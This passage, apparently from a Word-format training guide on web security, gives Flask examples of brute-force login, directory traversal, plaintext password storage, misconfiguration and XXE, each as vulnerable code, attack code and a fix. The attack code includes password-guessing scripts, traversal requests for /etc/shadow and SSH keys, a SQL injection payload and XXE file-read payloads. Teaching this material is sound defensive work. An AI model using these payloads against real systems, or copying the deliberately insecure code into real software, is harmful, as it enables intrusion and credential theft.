        <w:br/>
        <w:br/>
        <w:t>for password in passwords:</w:t>
        <w:br/>
        <w:t xml:space="preserve">    response = requests.post(target, json={</w:t>
        <w:br/>
        <w:t xml:space="preserve">        "username": username,</w:t>
        <w:br/>
        <w:t xml:space="preserve">        "password": password</w:t>
        <w:br/>
        <w:t xml:space="preserve">    })</w:t>
        <w:br/>
        <w:t xml:space="preserve">    </w:t>
        <w:br/>
        <w:t xml:space="preserve">    print(f"Trying: {password} - Status: {response.status_code}")</w:t>
        <w:br/>
        <w:t xml:space="preserve">    </w:t>
        <w:br/>
        <w:t xml:space="preserve">    if response.status_code == 200:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        print(f"SUCCESS! Password found: {password}")</w:t>
        <w:br/>
        <w:t xml:space="preserve">        break</w:t>
        <w:br/>
        <w:br/>
        <w:t># Advanced: Dictionary attack with common passwords</w:t>
        <w:br/>
        <w:t>with open('common_passwords.txt', 'r') as f:</w:t>
        <w:br/>
        <w:t xml:space="preserve">    for password in f:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        password = password.strip()</w:t>
        <w:br/>
        <w:t xml:space="preserve">        response = requests.post(target, json={</w:t>
        <w:br/>
        <w:t xml:space="preserve">            "username": username,</w:t>
        <w:br/>
        <w:t xml:space="preserve">            "password": password</w:t>
        <w:br/>
        <w:t xml:space="preserve">        })</w:t>
        <w:br/>
        <w:t xml:space="preserve">        if response.status_code == 200:</w:t>
        <w:br/>
        <w:t xml:space="preserve">            print(f"Password found: {password}")</w:t>
        <w:br/>
        <w:t xml:space="preserve">            break</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>FIX CODE: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import time</w:t>
        <w:br/>
        <w:br/>
        <w:t>users = {"admin": "complex_password_123"}</w:t>
        <w:br/>
        <w:t>failed_attempts = {}</w:t>
        <w:br/>
        <w:t>LOCKOUT_DURATION = 300  # 5 minutes</w:t>
        <w:br/>
        <w:t>MAX_ATTEMPTS = 3</w:t>
        <w:br/>
        <w:br/>
        <w:t>@app.route('/login', methods=['POST'])</w:t>
        <w:br/>
        <w:t>def login():</w:t>
        <w:br/>
        <w:t xml:space="preserve">    username = request.json.get('username')</w:t>
        <w:br/>
        <w:t xml:space="preserve">    password = request.json.get('password')</w:t>
        <w:br/>
        <w:t xml:space="preserve">    </w:t>
        <w:br/>
        <w:t xml:space="preserve">    # FIX: Implement rate limiting</w:t>
        <w:br/>
        <w:t xml:space="preserve">    now = time.time()</w:t>
        <w:br/>
        <w:t xml:space="preserve">    </w:t>
        <w:br/>
        <w:t xml:space="preserve">    if username in failed_attempts:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        attempts, lockout_until = failed_attempts[username]</w:t>
        <w:br/>
        <w:t xml:space="preserve">        </w:t>
        <w:br/>
        <w:t xml:space="preserve">        # Check if user is locked out</w:t>
        <w:br/>
        <w:t xml:space="preserve">        if lockout_until &gt; now:</w:t>
        <w:br/>
        <w:t xml:space="preserve">            remaining = int(lockout_until - now)</w:t>
        <w:br/>
        <w:t xml:space="preserve">            return jsonify({"error": f"Account locked. Try again in {remaining} seconds"}), 429</w:t>
        <w:br/>
        <w:t xml:space="preserve">        </w:t>
        <w:br/>
        <w:t xml:space="preserve">        # Reset if lockout expired</w:t>
        <w:br/>
        <w:t xml:space="preserve">        if lockout_until &lt;= now:</w:t>
        <w:br/>
        <w:t xml:space="preserve">            failed_attempts[username] = (0, 0)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    </w:t>
        <w:br/>
        <w:t xml:space="preserve">    if username in users and users[username] == password:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        # Success: reset failed attempts</w:t>
        <w:br/>
        <w:t xml:space="preserve">        if username in failed_attempts:</w:t>
        <w:br/>
        <w:t xml:space="preserve">            del failed_attempts[username]</w:t>
        <w:br/>
        <w:t xml:space="preserve">        return jsonify({"message": "Login successful"}), 200</w:t>
        <w:br/>
        <w:t xml:space="preserve">    else:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        # Failed: increment counter</w:t>
        <w:br/>
        <w:t xml:space="preserve">        if username not in failed_attempts:</w:t>
        <w:br/>
        <w:t xml:space="preserve">            failed_attempts[username] = (1, 0)</w:t>
        <w:br/>
        <w:t xml:space="preserve">        else:</w:t>
        <w:br/>
        <w:t xml:space="preserve">            attempts, _ = failed_attempts[username]</w:t>
        <w:br/>
        <w:t xml:space="preserve">            attempts += 1</w:t>
        <w:br/>
        <w:t xml:space="preserve">            </w:t>
        <w:br/>
        <w:t xml:space="preserve">            if attempts &gt;= MAX_ATTEMPTS:</w:t>
        <w:br/>
        <w:t xml:space="preserve">                lockout_until = now + LOCKOUT_DURATION</w:t>
        <w:br/>
        <w:t xml:space="preserve">                failed_attempts[username] = (attempts, lockout_until)</w:t>
        <w:br/>
        <w:t xml:space="preserve">                return jsonify({"error": "Too many failed attempts. Account locked."}), 429</w:t>
        <w:br/>
        <w:t xml:space="preserve">            </w:t>
        <w:br/>
        <w:t xml:space="preserve">            failed_attempts[username] = (attempts, 0)</w:t>
        <w:br/>
        <w:t xml:space="preserve">        </w:t>
        <w:br/>
        <w:t xml:space="preserve">        return jsonify({"error": "Invalid credentials"}), 401</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>7. Directory Traversal</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>VULNERABILITY:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>The application allows users to specify file paths without validation, enabling access to files outside the intended directory.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>VULNERABLE CODE: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from pathlib import Path</w:t>
        <w:br/>
        <w:t>BASE_DIR = Path("files")</w:t>
        <w:br/>
        <w:br/>
        <w:t>@app.route("/file")</w:t>
        <w:br/>
        <w:t>def read_file():</w:t>
        <w:br/>
        <w:t xml:space="preserve">    filename = request.args.get("name", "")</w:t>
        <w:br/>
        <w:t xml:space="preserve">    </w:t>
        <w:br/>
        <w:t xml:space="preserve">    # VULNERABLE: No path validation</w:t>
        <w:br/>
        <w:t xml:space="preserve">    file_path = BASE_DIR / filename</w:t>
        <w:br/>
        <w:t xml:space="preserve">    content = file_path.read_text(encoding="utf-8")</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return jsonify({"content": content}), 200</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>ATTACK CODE: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Attack 1: Read /etc/passwd</w:t>
        <w:br/>
        <w:t>GET /file?name=../../../etc/passwd HTTP/1.1</w:t>
        <w:br/>
        <w:br/>
        <w:t># Attack 2: Read application source code</w:t>
        <w:br/>
        <w:t>GET /file?name=../app.py HTTP/1.1</w:t>
        <w:br/>
        <w:br/>
        <w:t># Attack 3: Read SSH keys</w:t>
        <w:br/>
        <w:t>GET /file?name=../../../../home/user/.ssh/id_rsa HTTP/1.1</w:t>
        <w:br/>
        <w:br/>
        <w:t># Attack 4: Windows system files</w:t>
        <w:br/>
        <w:t>GET /file?name=..\..\..\windows\system32\drivers\etc\hosts HTTP/1.1</w:t>
        <w:br/>
        <w:br/>
        <w:t># Attack 5: URL encoded traversal</w:t>
        <w:br/>
        <w:t>GET /file?name=..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1</w:t>
        <w:br/>
        <w:br/>
        <w:t># Python attack script</w:t>
        <w:br/>
        <w:t>import requests</w:t>
        <w:br/>
        <w:br/>
        <w:t>base_url = "http://localhost:5000/file"</w:t>
        <w:br/>
        <w:t>targets = [</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "../../../etc/passwd",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "../../app.py",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "../../../etc/shadow",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "../../../../home/user/.bash_history",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "../../../var/log/apache2/access.log"</w:t>
        <w:br/>
        <w:t>]</w:t>
        <w:br/>
        <w:br/>
        <w:t>for target in targets:</w:t>
        <w:br/>
        <w:t xml:space="preserve">    response = requests.get(base_url, params={"name": target})</w:t>
        <w:br/>
        <w:t xml:space="preserve">    print(f"Target: {target}")</w:t>
        <w:br/>
        <w:t xml:space="preserve">    print(f"Status: {response.status_code}")</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if response.status_code == 200:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        print(f"Content: {response.json().get('content')[:200]}...")</w:t>
        <w:br/>
        <w:t xml:space="preserve">    print("-" * 50)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>FIX CODE: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from pathlib import Path</w:t>
        <w:br/>
        <w:t>import os</w:t>
        <w:br/>
        <w:br/>
        <w:t>BASE_DIR = Path("files").resolve()</w:t>
        <w:br/>
        <w:br/>
        <w:t>@app.route("/file")</w:t>
        <w:br/>
        <w:t>def read_file():</w:t>
        <w:br/>
        <w:t xml:space="preserve">    filename = request.args.get("name", "")</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if not filename:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        return jsonify({"error": "name is required"}), 400</w:t>
        <w:br/>
        <w:t xml:space="preserve">    </w:t>
        <w:br/>
        <w:t xml:space="preserve">    # FIX: Validate the resolved path</w:t>
        <w:br/>
        <w:t xml:space="preserve">    file_path = (BASE_DIR / filename).resolve()</w:t>
        <w:br/>
        <w:t xml:space="preserve">    </w:t>
        <w:br/>
        <w:t xml:space="preserve">    # Check if file is within BASE_DIR</w:t>
        <w:br/>
        <w:t xml:space="preserve">    try:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        file_path.relative_to(BASE_DIR)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    except ValueError:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        return jsonify({"error": "Access denied"}), 403</w:t>
        <w:br/>
        <w:t xml:space="preserve">    </w:t>
        <w:br/>
        <w:t xml:space="preserve">    if not file_path.exists() or not file_path.is_file():</w:t>
        <w:br/>
        <w:t xml:space="preserve">        return jsonify({"error": "file not found"}), 404</w:t>
        <w:br/>
        <w:t xml:space="preserve">    </w:t>
        <w:br/>
        <w:t xml:space="preserve">    content = file_path.read_text(encoding="utf-8", errors="ignore")</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return jsonify({"content": content}), 200</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>8. Insecure Storage</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>VULNERABILITY:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>The application stores passwords in plaintext, making them vulnerable if the database is compromised.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>VULNERABLE CODE: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USERS = {}</w:t>
        <w:br/>
        <w:br/>
        <w:t>@app.route("/register", methods=["POST"])</w:t>
        <w:br/>
        <w:t>def register():</w:t>
        <w:br/>
        <w:t xml:space="preserve">    username = request.json.get("username", "").strip()</w:t>
        <w:br/>
        <w:t xml:space="preserve">    password = request.json.get("password", "").strip()</w:t>
        <w:br/>
        <w:t xml:space="preserve">    </w:t>
        <w:br/>
        <w:t xml:space="preserve">    # VULNERABLE: Storing plaintext password</w:t>
        <w:br/>
        <w:t xml:space="preserve">    USERS[username] = {"password": password}</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return jsonify({"ok": True}), 200</w:t>
        <w:br/>
        <w:br/>
        <w:t>@app.route("/dump")</w:t>
        <w:br/>
        <w:t>def dump_users():</w:t>
        <w:br/>
        <w:t xml:space="preserve">    # This exposes all plaintext passwords</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return jsonify({"users": USERS}), 200</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>ATTACK CODE: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Attack 1: Access the dump endpoint</w:t>
        <w:br/>
        <w:t>GET /dump HTTP/1.1</w:t>
        <w:br/>
        <w:br/>
        <w:t># This will reveal all passwords in plaintext</w:t>
        <w:br/>
        <w:br/>
        <w:t># Attack 2: SQL injection to extract passwords</w:t>
        <w:br/>
        <w:t># If using a database instead of in-memory storage</w:t>
        <w:br/>
        <w:t>' UNION SELECT username, password FROM users --</w:t>
        <w:br/>
        <w:br/>
        <w:t># Python attack script</w:t>
        <w:br/>
        <w:t>import requests</w:t>
        <w:br/>
        <w:br/>
        <w:t># Register a test user</w:t>
        <w:br/>
        <w:t>requests.post("http://localhost:5000/register", json={</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "username": "test",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "password": "mypassword123"</w:t>
        <w:br/>
        <w:t>})</w:t>
        <w:br/>
        <w:br/>
        <w:t># Dump all users and passwords</w:t>
        <w:br/>
        <w:t>response = requests.get("http://localhost:5000/dump")</w:t>
        <w:br/>
        <w:t>users = response.json()["users"]</w:t>
        <w:br/>
        <w:br/>
        <w:t>print("Stolen passwords:")</w:t>
        <w:br/>
        <w:t>for username, data in users.items():</w:t>
        <w:br/>
        <w:t xml:space="preserve">    print(f"{username}: {data['password']}")</w:t>
        <w:br/>
        <w:br/>
        <w:t># If passwords are plaintext, attacker can use them directly</w:t>
        <w:br/>
        <w:t># If hashed, they can attempt to crack them offline</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>FIX CODE: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import hashlib</w:t>
        <w:br/>
        <w:t>import secrets</w:t>
        <w:br/>
        <w:br/>
        <w:t>USERS = {}</w:t>
        <w:br/>
        <w:br/>
        <w:t>def hash_password(password, salt=None):</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if salt is None:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        salt = secrets.token_hex(16)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    </w:t>
        <w:br/>
        <w:t xml:space="preserve">    # Use a strong hashing algorithm with salt</w:t>
        <w:br/>
        <w:t xml:space="preserve">    hashed = hashlib.pbkdf2_hmac('sha256', password.encode(), salt.encode(), 100000)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return f"{salt}${hashed.hex()}"</w:t>
        <w:br/>
        <w:br/>
        <w:t>def verify_password(password, hashed_password):</w:t>
        <w:br/>
        <w:t xml:space="preserve">    salt = hashed_password.split('$')[0]</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return hash_password(password, salt) == hashed_password</w:t>
        <w:br/>
        <w:br/>
        <w:t>@app.route("/register", methods=["POST"])</w:t>
        <w:br/>
        <w:t>def register():</w:t>
        <w:br/>
        <w:t xml:space="preserve">    username = request.json.get("username", "").strip()</w:t>
        <w:br/>
        <w:t xml:space="preserve">    password = request.json.get("password", "").strip()</w:t>
        <w:br/>
        <w:t xml:space="preserve">    </w:t>
        <w:br/>
        <w:t xml:space="preserve">    # FIX: Hash the password before storing</w:t>
        <w:br/>
        <w:t xml:space="preserve">    hashed = hash_password(password)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    USERS[username] = {"password": hashed}</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return jsonify({"ok": True}), 200</w:t>
        <w:br/>
        <w:br/>
        <w:t>@app.route("/login", methods=["POST"])</w:t>
        <w:br/>
        <w:t>def login():</w:t>
        <w:br/>
        <w:t xml:space="preserve">    username = request.json.get("username", "").strip()</w:t>
        <w:br/>
        <w:t xml:space="preserve">    password = request.json.get("password", "").strip()</w:t>
        <w:br/>
        <w:t xml:space="preserve">    </w:t>
        <w:br/>
        <w:t xml:space="preserve">    if username in USERS:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        if verify_password(password, USERS[username]["password"]):</w:t>
        <w:br/>
        <w:t xml:space="preserve">            return jsonify({"message": "Login successful"}), 200</w:t>
        <w:br/>
        <w:t xml:space="preserve">    </w:t>
        <w:br/>
        <w:t xml:space="preserve">    return jsonify({"error": "Invalid credentials"}), 401</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>9. Security Misconfiguration</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>VULNERABILITY:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>The application has multiple security misconfigurations: debug mode enabled, default credentials, hardcoded secrets, and information leakage.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>VULNERABLE CODE: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app = Flask(__name__)</w:t>
        <w:br/>
        <w:br/>
        <w:t># VULNERABLE: Debug mode enabled</w:t>
        <w:br/>
        <w:t>app.config['DEBUG'] = True</w:t>
        <w:br/>
        <w:br/>
        <w:t># VULNERABLE: Hardcoded secrets</w:t>
        <w:br/>
        <w:t>SECRET_KEY = "SUPER_SECRET_KEY_123"</w:t>
        <w:br/>
        <w:t>DB_PASSWORD = "DB_PASS_456"</w:t>
        <w:br/>
        <w:br/>
        <w:t># VULNERABLE: Default credentials</w:t>
        <w:br/>
        <w:t>ADMIN_USER = "admin"</w:t>
        <w:br/>
        <w:t>ADMIN_PASS = "admin"</w:t>
        <w:br/>
        <w:br/>
        <w:t>@app.route('/login', methods=['POST'])</w:t>
        <w:br/>
        <w:t>def login():</w:t>
        <w:br/>
        <w:t xml:space="preserve">    u = request.json.get('username')</w:t>
        <w:br/>
        <w:t xml:space="preserve">    p = request.json.get('password')</w:t>
        <w:br/>
        <w:t xml:space="preserve">    </w:t>
        <w:br/>
        <w:t xml:space="preserve">    if u == ADMIN_USER and p == ADMIN_PASS:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        return jsonify({</w:t>
        <w:br/>
        <w:t xml:space="preserve">            "message": "Welcome",</w:t>
        <w:br/>
        <w:t xml:space="preserve">            "secret_key": SECRET_KEY,  # Leaking secrets</w:t>
        <w:br/>
        <w:t xml:space="preserve">            "db_password": DB_PASSWORD</w:t>
        <w:br/>
        <w:t xml:space="preserve">        }), 200</w:t>
        <w:br/>
        <w:br/>
        <w:t>@app.route('/leak-env')</w:t>
        <w:br/>
        <w:t>def leak_env():</w:t>
        <w:br/>
        <w:t xml:space="preserve">    # Exposes environment variables</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return jsonify(dict(os.environ))</w:t>
        <w:br/>
        <w:br/>
        <w:t>if __name__ == '__main__':</w:t>
        <w:br/>
        <w:t xml:space="preserve">    app.run(host='0.0.0.0', port=5000, debug=True)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>ATTACK CODE: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Attack 1: Try default credentials</w:t>
        <w:br/>
        <w:t>POST /login HTTP/1.1</w:t>
        <w:br/>
        <w:t>Content-Type: application/json</w:t>
        <w:br/>
        <w:br/>
        <w:t>{</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "username": "admin",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "password": "admin"</w:t>
        <w:br/>
        <w:t>}</w:t>
        <w:br/>
        <w:br/>
        <w:t># Attack 2: Access environment leak endpoint</w:t>
        <w:br/>
        <w:t>GET /leak-env HTTP/1.1</w:t>
        <w:br/>
        <w:br/>
        <w:t># Attack 3: Trigger error to see debug information</w:t>
        <w:br/>
        <w:t>GET /nonexistent-page HTTP/1.1</w:t>
        <w:br/>
        <w:br/>
        <w:t># Attack 4: Access stack traces with secrets</w:t>
        <w:br/>
        <w:t>GET /crash HTTP/1.1</w:t>
        <w:br/>
        <w:br/>
        <w:t># Python attack script</w:t>
        <w:br/>
        <w:t>import requests</w:t>
        <w:br/>
        <w:br/>
        <w:t>base_url = "http://localhost:5000"</w:t>
        <w:br/>
        <w:br/>
        <w:t># Try default credentials</w:t>
        <w:br/>
        <w:t>common_creds = [</w:t>
        <w:br/>
        <w:t xml:space="preserve">    ("admin", "admin"),</w:t>
        <w:br/>
        <w:t xml:space="preserve">    ("admin", "password"),</w:t>
        <w:br/>
        <w:t xml:space="preserve">    ("root", "root"),</w:t>
        <w:br/>
        <w:t xml:space="preserve">    ("admin", "123456")</w:t>
        <w:br/>
        <w:t>]</w:t>
        <w:br/>
        <w:br/>
        <w:t>for username, password in common_creds:</w:t>
        <w:br/>
        <w:t xml:space="preserve">    response = requests.post(f"{base_url}/login", json={</w:t>
        <w:br/>
        <w:t xml:space="preserve">        "username": username,</w:t>
        <w:br/>
        <w:t xml:space="preserve">        "password": password</w:t>
        <w:br/>
        <w:t xml:space="preserve">    })</w:t>
        <w:br/>
        <w:t xml:space="preserve">    </w:t>
        <w:br/>
        <w:t xml:space="preserve">    if response.status_code == 200:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        print(f"Credentials found: {username}:{password}")</w:t>
        <w:br/>
        <w:t xml:space="preserve">        data = response.json()</w:t>
        <w:br/>
        <w:t xml:space="preserve">        print(f"Leaked data: {data}")</w:t>
        <w:br/>
        <w:t xml:space="preserve">        break</w:t>
        <w:br/>
        <w:br/>
        <w:t># Attempt to leak environment variables</w:t>
        <w:br/>
        <w:t>try:</w:t>
        <w:br/>
        <w:t xml:space="preserve">    response = requests.get(f"{base_url}/leak-env")</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if response.status_code == 200:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        print("Environment variables leaked:")</w:t>
        <w:br/>
        <w:t xml:space="preserve">        print(response.json())</w:t>
        <w:br/>
        <w:t>except:</w:t>
        <w:br/>
        <w:t xml:space="preserve">    pass</w:t>
        <w:br/>
        <w:br/>
        <w:t># Trigger errors to see debug info</w:t>
        <w:br/>
        <w:t>requests.get(f"{base_url}/crash")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>FIX CODE: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import os</w:t>
        <w:br/>
        <w:t>import secrets</w:t>
        <w:br/>
        <w:t>from flask import Flask, request, jsonify</w:t>
        <w:br/>
        <w:br/>
        <w:t>app = Flask(__name__)</w:t>
        <w:br/>
        <w:br/>
        <w:t># FIX: Use environment variables for secrets</w:t>
        <w:br/>
        <w:t>SECRET_KEY = os.environ.get('SECRET_KEY')</w:t>
        <w:br/>
        <w:t>if not SECRET_KEY:</w:t>
        <w:br/>
        <w:t xml:space="preserve">    raise ValueError("SECRET_KEY environment variable not set")</w:t>
        <w:br/>
        <w:br/>
        <w:t>DB_PASSWORD = os.environ.get('DB_PASSWORD')</w:t>
        <w:br/>
        <w:t>if not DB_PASSWORD:</w:t>
        <w:br/>
        <w:t xml:space="preserve">    raise ValueError("DB_PASSWORD environment variable not set")</w:t>
        <w:br/>
        <w:br/>
        <w:t># FIX: Strong credentials from environment</w:t>
        <w:br/>
        <w:t>ADMIN_USER = os.environ.get('ADMIN_USER')</w:t>
        <w:br/>
        <w:t>ADMIN_PASS = os.environ.get('ADMIN_PASS')</w:t>
        <w:br/>
        <w:br/>
        <w:t># FIX: Disable debug mode in production</w:t>
        <w:br/>
        <w:t>app.config['DEBUG'] = os.environ.get('FLASK_ENV') == 'development'</w:t>
        <w:br/>
        <w:br/>
        <w:t>@app.route('/login', methods=['POST'])</w:t>
        <w:br/>
        <w:t>def login():</w:t>
        <w:br/>
        <w:t xml:space="preserve">    u = request.json.get('username')</w:t>
        <w:br/>
        <w:t xml:space="preserve">    p = request.json.get('password')</w:t>
        <w:br/>
        <w:t xml:space="preserve">    </w:t>
        <w:br/>
        <w:t xml:space="preserve">    if u == ADMIN_USER and p == ADMIN_PASS:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        # Don't leak sensitive information</w:t>
        <w:br/>
        <w:t xml:space="preserve">        return jsonify({"message": "Welcome", "token": secrets.token_hex(16)}), 200</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return jsonify({"error": "Invalid credentials"}), 401</w:t>
        <w:br/>
        <w:br/>
        <w:t># Remove or protect sensitive endpoints</w:t>
        <w:br/>
        <w:t>@app.route('/health')</w:t>
        <w:br/>
        <w:t>def health():</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return jsonify({"status": "ok"}), 200</w:t>
        <w:br/>
        <w:br/>
        <w:t>if __name__ == '__main__':</w:t>
        <w:br/>
        <w:t xml:space="preserve">    # FIX: Never run with debug=True in production</w:t>
        <w:br/>
        <w:t xml:space="preserve">    app.run(host='0.0.0.0', port=5000, debug=False)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>10. XML External Entity (XXE)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>VULNERABILITY:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>The application parses XML input and resolves external entities, allowing attackers to read local files or perform SSRF attacks.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>VULNERABLE CODE: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import xml.etree.ElementTree as ET</w:t>
        <w:br/>
        <w:t>from pathlib import Path</w:t>
        <w:br/>
        <w:br/>
        <w:t>@app.route("/parse", methods=["POST"])</w:t>
        <w:br/>
        <w:t>def parse_xml():</w:t>
        <w:br/>
        <w:t xml:space="preserve">    xml_input = request.json.get("xml", "")</w:t>
        <w:br/>
        <w:t xml:space="preserve">    </w:t>
        <w:br/>
        <w:t xml:space="preserve">    # VULNERABLE: Resolves external entities manually</w:t>
        <w:br/>
        <w:t xml:space="preserve">    entity_matches = re.findall(</w:t>
        <w:br/>
        <w:t xml:space="preserve">        r"&lt;!ENTITY\s+([A-Za-z0-9_:-]+)\s+SYSTEM\s+['"]file://([^'"]+)['"]&gt;",</w:t>
        <w:br/>
        <w:t xml:space="preserve">        xml_input</w:t>
        <w:br/>
        <w:t xml:space="preserve">    )</w:t>
        <w:br/>
        <w:t xml:space="preserve">    </w:t>
        <w:br/>
        <w:t xml:space="preserve">    if entity_matches:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        resolved_xml = xml_input</w:t>
        <w:br/>
        <w:t xml:space="preserve">        extracted = ""</w:t>
        <w:br/>
        <w:t xml:space="preserve">        for name, file_path in entity_matches:</w:t>
        <w:br/>
        <w:t xml:space="preserve">            # Reading arbitrary files!</w:t>
        <w:br/>
        <w:t xml:space="preserve">            value = Path(file_path).read_text(encoding="utf-8")</w:t>
        <w:br/>
        <w:t xml:space="preserve">            resolved_xml = resolved_xml.replace(f"&amp;{name};", value)</w:t>
        <w:br/>
        <w:t xml:space="preserve">            extracted += value</w:t>
        <w:br/>
        <w:t xml:space="preserve">        </w:t>
        <w:br/>
        <w:t xml:space="preserve">        return jsonify({</w:t>
        <w:br/>
        <w:t xml:space="preserve">            "parsed_output": resolved_xml,</w:t>
        <w:br/>
        <w:t xml:space="preserve">            "sensitive_data": extracted</w:t>
        <w:br/>
        <w:t xml:space="preserve">        }), 200</w:t>
        <w:br/>
        <w:t xml:space="preserve">    </w:t>
        <w:br/>
        <w:t xml:space="preserve">    parsed = ET.fromstring(xml_input)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return jsonify({"parsed_output": ET.tostring(parsed, encoding="unicode")}), 200</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>ATTACK CODE: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Attack 1: Read /etc/passwd</w:t>
        <w:br/>
        <w:t>POST /parse HTTP/1.1</w:t>
        <w:br/>
        <w:t>Content-Type: application/json</w:t>
        <w:br/>
        <w:br/>
        <w:t>{</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "xml": "&lt;?xml version=\"1.0\"?&gt;&lt;!DOCTYPE root [&lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\"&gt;]&gt;&lt;root&gt;&amp;xxe;&lt;/root&gt;"</w:t>
        <w:br/>
        <w:t>}</w:t>
        <w:br/>
        <w:br/>
        <w:t># Attack 2: Read application source code</w:t>
        <w:br/>
        <w:t>{</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "xml": "&lt;?xml version=\"1.0\"?&gt;&lt;!DOCTYPE root [&lt;!ENTITY xxe SYSTEM \"file:///app/app.py\"&gt;]&gt;&lt;root&gt;&amp;xxe;&lt;/root&gt;"</w:t>
        <w:br/>
        <w:t>}</w:t>
        <w:br/>
        <w:br/>
        <w:t># Attack 3: SSRF to internal services</w:t>
        <w:br/>
